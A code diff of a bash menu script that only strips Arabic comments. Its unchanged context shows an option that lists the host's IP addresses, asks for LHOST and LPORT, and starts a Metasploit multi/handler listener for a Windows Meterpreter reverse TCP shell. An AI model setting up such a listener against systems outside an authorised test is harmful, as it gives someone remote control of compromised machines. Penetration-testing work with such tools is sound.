@@ -42,7 +42,7 @@ execute_option() {
     case $1 in
         1)
             xterm -hold -e "
-                # عرض عناوين IP
+               
                 echo '========================================================================='
                 echo 'IPv4 and IPv6 Addresses'
                 echo '========================================================================='
@@ -53,7 +53,7 @@ execute_option() {
                 ip -6 addr show | grep inet6 | awk '{print \$2}'
                 echo '========================================================================='
 
-                # طلب إدخال LHOST و LPORT
+               
                 echo 'Enter LHOST (IP address for Metasploit):'
                 read LHOST
                 echo 'Enter LPORT (Port for Metasploit):'
@@ -63,7 +63,7 @@ execute_option() {
                 echo \$LHOST
                 echo 'Starting Metasploit with LHOST=\$LHOST and LPORT=\$LPORT...'
 
-                # بدء Metasploit
+                
                 msfconsole -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
             " &
             ;;
